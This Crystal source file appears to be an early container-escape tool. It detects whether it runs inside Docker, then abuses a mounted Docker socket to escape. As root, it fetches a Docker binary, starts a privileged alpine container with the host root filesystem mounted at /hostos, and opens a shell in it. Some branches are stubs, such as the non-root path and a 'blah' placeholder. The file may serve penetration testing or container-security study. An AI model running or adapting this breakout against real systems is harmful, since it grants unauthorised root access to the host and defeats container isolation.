require "http/client"
require "./net_sample"

puts %q{
8888888b.                 888                     
888   Y88b                888                     
888    888                888                     
888    888 .d88b.  .d8888b888  888 .d88b. 888d888 
888    888d88  88bd88P    888 .88Pd8P  Y8b888P   
888    888888  888888     888888K 88888888888     
888  .d88PY88..88PY88b.   888  88bY8b.    888     
8888888P    Y88P    Y8888P888  888  Y8888 888       
                                                  
                                                  
                                                  
8888888888                                         
888                                                
888                                                
8888888    d8888b  .d8888b 8888b. 88888b.  .d88b.  
888       88K     d88P         88b888  88bd8P  Y8b 
888        Y8888b.888     .d888888888  88888888888 
888            X88Y88b.   888  888888 d88PY8b.     
8888888888 88888P   Y8888P Y88888888888P    Y8888  
                                  888              
                                  888              
                                  888              
88888888888             888 
    888                 888 
    888                 888 
    888  .d88b.  .d88b. 888 
    888 d88  88bd88  88b888 
    888 888  888888  888888 
    888 Y88..88PY88..88P888 
    888   Y88P    Y88P  888}

lib LibC
  fun getuid : Int
end

def main
  user_namespace_enabled=false
  container=in_container?
  if ARGV.size>0 && ARGV[0].to_s =="escape"
    breakout()
  elsif ARGV.size>0
    puts "Usage"
  end
end

def breakout
  puts("\n================================================")
  puts("======= Start common breakout techniques =======")
  puts("================================================")

  if unix_socket_present?
    unix_socket_breakout
    exit()
  end
  if is_net_mode_host?
    puts("blah")
  end

end

def unix_socket_present?
  present=File.exists?("/var/run/docker.sock")
  puts("\n================================================")
  puts("========== Docker UNIX Socket Present ==========")
  puts("================================================")
  present
end

def unix_socket_breakout
  uid=LibC.getuid
  if uid == 0
    puts("We're root, let's try and install Docker")
    apk_loc = `which apk`
    apt_loc = `which apt`
    yum_loc = `which yum`
    apk_loc = ""
    apt_loc = ""
    yum_loc =""

    if !apk_loc.empty?
      puts "APK install.."
      puts `apk update && apk install docker`
    elsif !apt_loc.empty?
      puts "APT install.."
      puts `apt update &&apt install docker`
    elsif !yum_loc.empty?
      puts "YUM install.."
      puts `yum install docker`
    else
      HTTP::Client.get("https://download.docker.com/linux/static/stable/x86_64/docker-18.09.3.tgz") do |response|
        File.write("./docker-18.09.3.tgz", response.body_io)
      end
      `tar xzvf ./docker-18.09.3.tgz`
    end
    puts `./docker/docker rm -f super_legit_docker_escape; ./docker/docker run -i -t -d -v /:/hostos --privileged --name super_legit_docker_escape alpine /bin/sh`
    puts "We should have started a privileged container with the host OS filesystem mounted."
    puts "Let's try to start a shell inside that container"
    system("./docker/docker exec -i -t super_legit_docker_escape /bin/sh")
  else
    puts("Not root. Let's try to use Curl")
  end

end

def in_container?
  puts("\n================================================")
  puts("=========Check if we're in a container==========")
  puts("================================================")
  container=false

  # Docker init/env files
  puts("\n==> Check for Docker Env/Init files.")
  if File.exists?("/.dockerenv")
    puts("•  Docker Env file exists, likely we're in a container built >=1.11")
    container=true
  elsif File.exists?("/.dockerinit")
    puts("•  Docker Init file exists, likely we're in an old container build pre 1.11")
    container=true
  else
    puts("•  No docker init/env files found.")
  end

  # Device checks
  puts("\n==> Check for devices.")
  dev_files = Dir.new("/dev")

  #if dev_files.len() > 16
  block_devices = [] of String
  puts("? More devices than usual found. Checking for block storage devices:")
  dev_files.each do |device|
    if device.to_s.includes?("sda")
      puts(device)
    end
  end

  # Cgroups check
  puts("\n==> Check for cgroups.")
  if File.exists?("/proc/1/cgroup") && File.new("/proc/1/cgroup").gets_to_end.includes?("docker")
    puts("•  Docker mentioned in cgroups. Likely we're in an container")
    container=true
  else
    puts("•  No Docker mentioned in cgroups. Unlikely we're in a container")
  end

  # Process checks
  puts("\n==> Check for processes.")
  processes = `ps aux`
  init_process =processes.split("\n")[1]

  common_init_processes=["init","systemd"]
  common_init_found=false
  common_init_processes.each do |common_init_process|
    if common_init_process.to_s.includes?(init_process)
      common_init_found=true
    end
  end
  if !common_init_found
    container=true
    puts("•  No common init found. Init is:\n#{init_process}")
  else
    puts("•  Common init found.")
  end
  puts("\n================================================")
  if container
    puts("========== We're in a container ================")
  else
    puts("======== We're not in a container ==============")
  end
  puts("================================================\n")
  container
end

def is_net_mode_host?
  net_mode_host=false
  interfaces = NetSample::NIC.ifnames
  interfaces.each do | interface |
    if interface.includes? "docker" 
      puts("We're sharing the host network stack. It's worth nmap scanning localhost. We'll check for docker ports on 3275/6 now")
      net_mode_host=true
    end
  end
  net_mode_host
end

main()
